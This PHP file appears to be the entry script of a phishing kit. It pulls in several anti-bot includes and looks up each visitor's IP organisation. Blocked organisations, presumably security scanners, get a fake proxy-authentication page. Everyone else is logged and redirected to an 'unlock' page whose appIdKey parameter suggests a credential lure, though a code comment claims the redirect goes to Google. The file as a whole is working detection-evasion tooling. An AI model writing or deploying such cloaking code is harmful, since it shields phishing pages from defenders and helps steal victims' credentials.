<?php
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
// Configuration
$blockedOrganizationsFile = "organizations.txt"; // File containing blocked organizations, one per line
$redirectCountryGoogle = "ALL"; // Specify a country code (e.g., "US", "RO") or "ALL" for global handling
$apiUrl = "https://ip-info.ff.avast.com/v2/info?ip="; // Avast API URL
$redirectLogFile = "AH.txt"; // Log file for IPs redirected to Google
$blockLogFile = ""; // Log file for blocked IPs

// Function to get IP info from Avast API
function getIpInfo($ip) {
    global $apiUrl;
    $response = file_get_contents($apiUrl . $ip);
    return json_decode($response, true);
}

// Function to check if the organization is blocked
function isOrganizationBlocked($organization) {
    global $blockedOrganizationsFile;
    if (!file_exists($blockedOrganizationsFile)) {
        file_put_contents($blockedOrganizationsFile, ""); // Create file if it doesn't exist
    }
    $blockedOrgs = file($blockedOrganizationsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($organization, $blockedOrgs);
}

// Function to log IPs
function logIp($file, $ip, $organization, $country) {
    $logData = sprintf("[%s] IP: %s | Organization: %s | Country: %s\n", date("Y-m-d H:i:s"), $ip, $organization, $country);
    file_put_contents($file, $logData, FILE_APPEND);
}

// Get the visitor's IP
$ip = $_SERVER['REMOTE_ADDR'];
$ipInfo = getIpInfo($ip);

if ($ipInfo) {
    $countryCode = $ipInfo['country'];
    $organization = $ipInfo['organization'];

    // Check if the specified country is "ALL" or matches the visitor's country
    if ($redirectCountryGoogle === "ALL" || $countryCode === $redirectCountryGoogle) {
        // Check if the organization is blocked
        if (isOrganizationBlocked($organization)) {
            // Log blocked IPs with details
            logIp($blockLogFile, $ip, $organization, $countryCode);
            // Show block page
            showBlockPage($ipInfo);
            exit;
        } else {
            // Log redirected IPs with details
            logIp($redirectLogFile, $ip, $organization, $countryCode);
            // Redirect to Google
            header("Location: web/add.php?unlock=code&appIdKey=1834f733528e1a9fc930069fa3763a2809d41769&country=none");
            exit;
        }
    } else {
        // Log blocked IPs with details
        logIp($blockLogFile, $ip, $organization, $countryCode);
        // Block all other countries
        showBlockPage($ipInfo);
        exit;
    }
} else {
    echo "Error: Unable to fetch IP information.";
    exit;
}

// Function to display the block page
function showBlockPage($ipInfo) {
    ?>
<?php
header('HTTP/1.1 407 Proxy Authentication Required');
header('Date: Wed, 21 Oct 2015 07:28:00 GMT');
header('Proxy-Authenticate: Basic realm="Access to internal site"');

echo "HTTP/1.1 407 Proxy Authentication Required\n";
echo "Date: Wed, 21 Oct 2015 07:28:00 GMT\n";
echo 'Proxy-Authenticate: Basic realm="Access to internal site"' . "\n";
?>
    

<div id="extension-mmplj"></div></body></html>
    <?php
}
?>
